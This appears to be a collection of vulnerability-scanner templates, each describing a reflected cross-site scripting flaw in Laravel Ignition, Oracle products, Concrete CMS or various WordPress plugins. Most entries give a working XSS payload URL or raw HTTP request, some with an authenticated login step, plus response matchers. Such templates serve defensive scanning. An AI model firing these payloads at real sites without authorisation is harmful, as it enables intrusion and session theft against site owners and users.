# DOM Invader - Cross-Site Scripting
## Description
- DOM Invader contains a cross-site scripting vulnerability in Sources & Sinks functionality.
- severity - high
- tags - xss,file

---
# Laravel Ignition - Cross-Site Scripting
## Description
- Laravel Ignition contains a cross-site scripting vulnerability when debug mode is enabled.

- severity - high
- tags - laravel,xss,ignition
## Requests
- Method - GET
### URL
- {{BaseURL}}/_ignition/scripts/-->\<svg%20onload=alert(document.domain)>
### Matchers

**Type - word**
- part - body
- words
    1. Undefined index: -->\<svg onload=alert(document.domain)> in file

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 500

---
# HTTPBin - Cross-Site Scripting
## Description
- HTTPBin contains a cross-site scripting vulnerability which can allow an attacker to execute arbitrary script. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,httpbin,oss
## Requests
- Method - GET
### URL
- {{BaseURL}}/base64/PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+
### Matchers

**Type - regex**
- part - body
- regex
    1. ^\<script>alert\(document.domain\)\</script>$

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Concrete CMS \<8.5.2 - Cross-Site Scripting
## Description
- Concrete CMS before 8.5.2 contains a cross-site scripting vulnerability in preview_as_user function using cID parameter.
- severity - high
- tags - hackerone,concrete,xss,cms,unauth
## Requests
- Method - GET
### URL
- {{BaseURL}}/ccm/system/panels/page/preview_as_user/preview?cID=">\</iframe>\<svg/onload=alert("{{randstr}}")>
### Matchers

**Type - word**
- part - body
- words
    1. \</iframe>\<svg/onload=alert("{{randstr}}")>

**Type - word**
- part - header
- words
    1. text/html
    2. CONCRETE5
- condition - and

**Type - status**
- status
    1. 200

---
# Oracle E-Business Suite - Cross-Site Scripting
- severity - medium
- tags - oracle,xss,ebs
## Requests
- Method - GET
### URL
- {{BaseURL}}/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
- {{BaseURL}}/OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
- {{BaseURL}}/OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert('{{randstr}}')%3E
### Matchers

**Type - word**
- words
    1. \<svg/onload=alert('{{randstr}}')>
- part - body

**Type - status**
- status
    1. 200

**Type - word**
- words
    1. text/html
- part - header

---
# Oracle Siebel Loyalty 8.1 - Cross-Site Scripting
## Description
- A vulnerability in Oracle Siebel Loyalty allows remote unauthenticated attackers to inject arbitrary Javascript code into the responses returned by the '/loyalty_enu/start.swe/' endpoint.
- severity - high
- tags - xss,oracle,siebel,packetstorm,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WPify Woo Czech \<3.5.7 - Cross-Site Scripting
## Description
- WordPress WPify Woo Czech plugin before 3.5.7 contains a cross-site scripting vulnerability. The plugin uses the Vies library 2.2.0, which has a sample file outputting $_SERVER['PHP_SELF'] in an attribute without being escaped first. The issue is only exploitable when the web server has the PDO driver installed and write access to the example directory.
- severity - high
- tags - wp,wordpress,xss,wp-plugin,wpify,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wpify-woo/deps/dragonbe/vies/examples/async_processing/queue.php/">\<script>alert(document.domain)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>
    2. Add a new VAT ID to the queue
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting
## Description
- WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.

- severity - medium
- tags - xss,,wp,wpscan,wordpress,wp-plugin
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&
### Matchers

**Type - word**
- part - body
- words
    1. value="FB_appId">\<script>alert(document.domain)\</script>"

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# WordPress Ambience Theme \<=1.0 - Cross-Site Scripting
## Description
- WordPress Ambience Theme 1.0 and earlier was affected by a cross-site scripting vulnerability.

- severity - medium
- tags - wp-plugin,wp,edb,wpscan,wordpress,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/themes/ambience/thumb.php?src=%3Cbody%20onload%3Dalert(1)%3E.jpg
### Matchers

**Type - word**
- part - body
- words
    1. \<body onload=alert(1)>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Woody Code Snippets \<2.4.6 - Cross-Site Scripting
## Description
- WordPress Woody Code Snippets plugin before 2.4.6 contains a cross-site scripting vulnerability. It does not escape generated URLs before outputting them back in an attribute.
- severity - high
- tags - xss,wp,wordpress,authenticated,woody,wpscan,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/edit.php?post_type=wbcr-snippets&page=import-wbcr_insert_php&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. import-wbcr_insert_php&a\">\<script>alert(1)\</script>"
    2. Woody Code Snippets Import
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Clearfy Cache \<2.0.5 - Cross-Site Scripting
## Description
- WordPress Clearfy Cache 2.0.5 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,authenticated,clearfy-cache,wpscan,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=gonzales-wbcr_clearfy&action=index&wbcr_assets_manager=1&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(1)\</script>
    2. Webcraftic Clearfy - WordPress optimization plugin
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Wordpress Wordfence - Cross-Site Scripting
## Description
- Wordpress Wordfence is vulnerable to cross-site scripting.
- severity - medium
- tags - wordpress,wordfence,xss,bypass
## Requests
- Method - GET
### URL
- {{BaseURL}}/?s=ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6
### Matchers

**Type - word**
- words
    1. \<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Flow-Flow Social Stream \<=3.0.71 - Cross-Site Scripting
## Description
- WordPress Flow-Flow Social Stream 3.0.7.1 and prior is vulnerable to cross-site scripting.
- severity - medium
- tags - xss,wordpress,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=fetch_posts&stream-id=1&hash=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
### Matchers

**Type - word**
- part - body
- words
    1. "hash":"\<img src=x onerror=alert(document.domain)>"
    2. "errors"
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Checkout Fields Manager for WooCommerce \<5.5.7 - Cross-Site Scripting
## Description
- WordPress Checkout Fields Manager for WooCommerce 5.5.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - xss,wp,wordpress,authenticated,woocommerce,wpscan,wp-plugin
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=wc-settings&tab=wooccm&section=advanced&">--><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. >-->\<script>alert(1)\</script>&action=wooccm_nuke_options&

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress ShortPixel Image Optimizer \<4.22.10 - Cross-Site Scripting
## Description
- WordPress ShortPixel Image Optimizer 4.22.10 does not escape generated URLs before outputting them back in an attribute, leading to reflected cross-site scripting.
- severity - medium
- tags - shortpixel,authenticated,wpscan,xss,wp-plugin,wp,wordpress
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/options-general.php?page=wp-shortpixel-settings&"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. &\">\<script>alert(1)\</script>&noheader=true&sp-action

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress NextGEN Gallery 1.9.10 - Cross-Site Scripting
## Description
- WordPress NextGEN Gallery 1.9.10 plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - wp-plugin,edb,wordpress,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress PHPFreeChat 0.2.8 - Cross-Site Scripting
## Description
- WordPress PHPFreeChat 0.2.8 plugin contains a cross-site scripting vulnerability via the url parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,wp-plugin,edb,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/phpfreechat/lib/csstidy-1.2/css_optimiser.php?url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress WooCommerce Google Shopping \< 1.2.4 - Cross-Site Scripting
## Description
- WordPress WooCommerce Google Shopping \< 1.2.4 is susceptible to cross-site scripting because the plugin does not sanitize or escape the search GET parameter before outputting it back in the page and executing it in a logged in admin context.
- severity - high
- tags - wp-plugin,xss,authenticated,woocommerce,wpscan,wordpress
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=elex-product-feed-manage&search=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Members List \<4.3.7 - Cross-Site Scripting
## Description
- WordPress Members List 4.3.7 does not sanitize and escape some parameters in various pages before outputting them back, leading to reflected cross-site scripting vulnerabilities.
- severity - medium
- tags - wp,wordpress,wp-plugin,xss,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/members-list/admin/view/user.php?page=%22%3E%3Cimg%20src%20onerror=alert(document.domain)%20x
### Matchers

**Type - word**
- part - body
- words
    1. ">\<img src onerror=alert(document.domain) x
    2. wrap tern-wrap
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Finder - Cross-Site Scripting
## Description
- WordPress Plugin Finder contains a cross-site scripting vulnerability via the order parameter. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - xss,wp-plugin,packetstorm,wordpress
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/finder/index.php?by=type&dir=tv&order=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress FlagEm - Cross-Site Scripting
## Description
- WordPress FlagEm plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - wordpress,xss,wp-plugin,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Slideshow - Cross-Site Scripting
## Description
- WordPress Slideshow plugin contains multiple cross-site scripting vulnerabilities. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - high
- tags - wordpress,xss,wp-plugin,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/slideshow-jquery-image-gallery/views/SlideshowPlugin/slideshow.php?randomId=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- words
    1. \</script>\<script>alert(document.domain)\</script>
- part - body

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress SocialFit - Cross-Site Scripting
## Description
- WordPress SocialFit is vulnerable to a cross-site scripting vulnerability via the 'msg' parameter because it fails to properly sanitize user-supplied input.

- severity - high
- tags - wordpress,xss,wp-plugin,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/socialfit/popup.php?service=googleplus&msg=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress My Chatbot \<= 1.1 - Cross-Site Scripting
## Description
- WordPress My Chatbot \<= 1.1  is susceptible to cross-site scripting. The plugin does not sanitize or escape its tab parameter in the Settings page before outputting it back in an attribute.
- severity - high
- tags - wordpress,wp-plugin,xss,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/options-general.php?page=my-chatbot&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress 404 to 301 Log Manager \<3.1.2 - Cross-Site Scripting
## Description
- WordPress 404 to 301 Log Manager 3.1.2 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wpscan,wp-plugin,xss,wp,wordpress,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=jj4t3-logs&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(1)\</script>
    2. 404 Error Logs
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress All Export \<1.3.6 - Cross-Site Scripting
## Description
- WordPress All Export plugin before version 1.3.6 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wp-plugin,xss,wp,wordpress,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=pmxe-admin-manage&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. manage&a\">\<script>alert(1)\</script>">
    2. Manage Exports
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Code Snippets - Cross-Site Scripting
## Description
- WordPress Code Snippets plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
- severity - medium
- tags - wordpress,xss,wp-plugin,authenticated
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<script>alert(document.domain)\</script>
    2. toplevel_page_snippets
    3. Search results in tag
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress SEO Redirection \<7.4 - Cross-Site Scripting
## Description
- WordPress SEO Redirection 7.4 does not escape the tab parameter before outputting it back in JavaScript code, leading to a reflected cross-site scripting vulnerability.

- severity - medium
- tags - wordpress,xss,wp-plugin,authenticated,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
POST /wp-admin/options-general.php?page=seo-redirection.php&tab=cutom HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

tab=%3C%2Fscript%3E%3Csvg%2Fonload%3Dalert%28%2FXSS%2F%29%3E

```
### Step - 3
```
GET /wp-admin/admin.php?page=wpda_duplicate_post_menu HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. \</script>\<svg/onload=alert(/XSS/)>
    2. settings_page_seo-redirection
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Adaptive Images \< 0.6.69 - Cross-Site Scripting
## Description
- WordPress Adaptive Images \< 0.6.69 is susceptible to cross-site scripting because the plugin does not sanitize and escape the REQUEST_URI before outputting it back in a page.
- severity - high
- tags - wpscan,wordpress,xss,wp-plugin,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/adaptive-images/adaptive-images-script.php/%3Cimg/src/onerror=alert(document.domain)%3E/?debug=true
### Matchers

**Type - word**
- words
    1. \<img/src/onerror=alert(document.domain)>
    2. \<td>Image\</td>
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Age Gate \<2.20.4 - Cross-Site Scripting
## Description
- WordPress Age Gate plugin before 2.20.4 contains a cross-site scripting vulnerability. The plugin does not escape some URLs before outputting them back in attributes.

- severity - high
- tags - xss,authenticated,age-gate,wpscan,wordpress,wp-plugin,wp
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=age-gate&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>
    2. Age Gate Restriction Settings
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Analytify \<4.2.1 - Cross-Site Scripting
## Description
- WordPress Analytify 4.2.1 does not escape the current URL before outputting it back in a 404 page when the 404 tracking feature is enabled, leading to reflected cross-site scripting.

- severity - medium
- tags - wp,wordpress,analytify,wpscan,wp-plugin,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/aa404bb?a\</script>\<script>alert(/XSS/)\</script>
### Matchers

**Type - word**
- part - body
- words
    1. text/javascript">alert(/XSS/)\</script>
    2. wp-analytify
- condition - and

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 404

---
# WordPress CURCY - Multi Currency for WooCommerce \<2.1.18 - Cross-Site Scripting
## Description
- WordPress CURCY - Multi Currency for WooCommerce 2.1.18 does not escape some generated URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wp-plugin,xss,wp,wordpress,authenticated,curcy,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=wc-reports&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. wc-reports&a\">\<script>alert(1)\</script>">All

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WPtouch \< 4.3.44 - Cross Site Scripting
## Description
- The plugin does not escape some URLs before outputting them back in attributes, leading to Reflected Cross-Site Scripting.

- severity - medium
- tags - wp-plugin,wp,wordpress,xss,authenticated,wptouch,wpscan
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/admin.php?page=wptouch-admin-license&a%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ">\<script>alert(document.domain)\</script>

**Type - word**
- part - body
- words
    1. WPtouchCustom
    2. WPtouchAjax
    3. toplevel_page_wptouch-admin
- condition - or

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Sassy Social Share \<=3.3.3 - Cross-Site Scripting
## Description
- WordPress Sassy Social Share 3.3.3 and prior is vulnerable to cross-site scripting because certain AJAX endpoints return JSON data with no Content-Type header set and then use the default text/html. In other words, any JSON that has HTML will be rendered as such.

- severity - medium
- tags - xss,wp,wpscan,wordpress,wp-plugin,sassy
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=heateor_sss_sharing_count&urls[%3Cimg%20src%3dx%20onerror%3dalert(document.domain)%3E]=
### Matchers

**Type - word**
- part - body
- words
    1. [{"\<img src=x onerror=alert(document.domain)>":""}]
    2. facebook
    3. twitter
- condition - and

**Type - word**
- part - header
- words
    1. application/json
- negative - True

**Type - status**
- status
    1. 200

---
# WordPress Modula Image Gallery \<2.6.7 - Cross-Site Scripting
## Description
- WordPress Modula Image Gallery 2.6.7 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - authenticated,wpscan,wp-plugin,xss,wp,wordpress
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/edit.php?post_type=modula-gallery&page=modula-addons&a"><script>alert(1)</script> HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. &a\">\<script>alert(1)\</script>&extensions=

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress New User Approve \<2.4.1 - Cross-Site Scripting
## Description
- WordPress New User Approve 2.4.1 does not escape some URLs before outputting them back in attributes, leading to reflected cross-site scripting.
- severity - medium
- tags - wordpress,xss,authenticated,wp-plugin,wpscan,wp
## Requests
### Step - 1
```
POST /wp-login.php HTTP/1.1
Host: {{Hostname}}
Origin: {{RootURL}}
Content-Type: application/x-www-form-urlencoded
Cookie: wordpress_test_cookie=WP%20Cookie%20check

log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1

```
### Step - 2
```
GET /wp-admin/index.php?a%22%3E%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - body
- words
    1. ?a">\<script>alert(1)\</script>&new-user-approve-settings

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Blogroll Fun-Show Last Post and Last Update Time 0.8.4 - Cross-Site Scripting
## Description
- WordPress Plugin Blogroll Fun-Show Last Post and Last Update Time 0.8.4 and possibly prior versions are prone to a cross-site scripting vulnerability because of a failure to properly sanitize user-supplied input. An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.

- severity - high
- tags - wordpress,wp-plugin,xss,unauth,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/blogroll-fun/blogroll.php?k=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
### Matchers

**Type - word**
- part - body
- words
    1. Got: \<script>alert(document.domain)\</script>\<br>

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# WordPress Wordfence 7.4.6 - Cross0Site Scripting
## Description
- WordPress Wordfence 7.4.6 is vulnerable to cross-site scripting.
- severity - medium
- tags - wordpress,wp-plugin,xss,wordfence
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/wordfence/lib/diffResult.php?file=%27%3E%22%3Csvg%2Fonload=confirm%28%27test%27%29%3E
### Matchers

**Type - word**
- words
    1. '>"\<svg/onload=confirm('test')>
- part - body

**Type - word**
- words
    1. text/html
- part - header

**Type - status**
- status
    1. 200

---
# WordPress Manage Calameo Publications 1.1.0 - Cross-Site Scripting
## Description
- WordPress Manage Calameo Publications 1.1.0 is vulnerable to reflected cross-site scripting via  thickbox_content.php and the attachment_id parameter.

- severity - medium
- tags - wordpress,wp-plugin,xss,wp,wpscan
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/athlon-manage-calameo-publications/thickbox_content.php?attachment_id=id%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%26
### Matchers

**Type - word**
- part - body
- words
    1. ath_upload_calameo_publication(id\">\<script>alert(document.domain)\</script>&)

**Type - word**
- part - header
- words
    1. text/html

**Type - status**
- status
    1. 200

---
# Zebra_Form PHP Library \<= 2.9.8 - Cross-Site Scripting
## Description
- Zebra_Form PHP library 2.9.8 and prior (which is used by some WordPress plugins) is affected by reflected cross-site scripting vulnerabilities via process.php.

- severity - medium
- tags - wordpress,xss,wp,wpscan
## Requests
### Step - 1
```
POST /wp-content/plugins/wp-ticket/assets/ext/zebraform/process.php?form=%3C/script%3E%3Cimg%20src%20onerror=alert(document.domain)%3E&control=upload HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Content-Type: multipart/form-data; boundary=---------------------------77916619616724262872902741074
Origin: null

-----------------------------77916619616724262872902741074
Content-Disposition: form-data; name="upload"; filename="{{randstr}}.txt"
Content-Type: text/plain
Test
-----------------------------77916619616724262872902741074--

```
### Matchers

